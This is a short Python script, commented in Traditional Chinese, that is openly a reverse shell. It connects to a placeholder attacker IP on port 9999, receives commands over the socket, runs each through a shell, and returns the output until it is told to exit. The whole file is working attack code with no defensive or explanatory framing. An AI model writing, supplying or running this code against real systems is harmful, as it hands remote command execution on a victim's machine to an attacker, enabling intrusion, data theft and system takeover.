import socket
import subprocess

# 攻擊者的 IP 和端口
attacker_ip = 'attacker_ip_here'  # 攻擊者的 IP 地址
attacker_port = 9999             # 攻擊者的端口

# 建立反向連接
def reverse_shell():
    try:
        # 創建一個 socket 並連接到攻擊者的地址
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        
        # 從攻擊者端接收命令並執行
        while True:
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)
        
        s.close()
    except Exception as e:
        print(f"Error: {e}")

# 執行反向連接
reverse_shell()
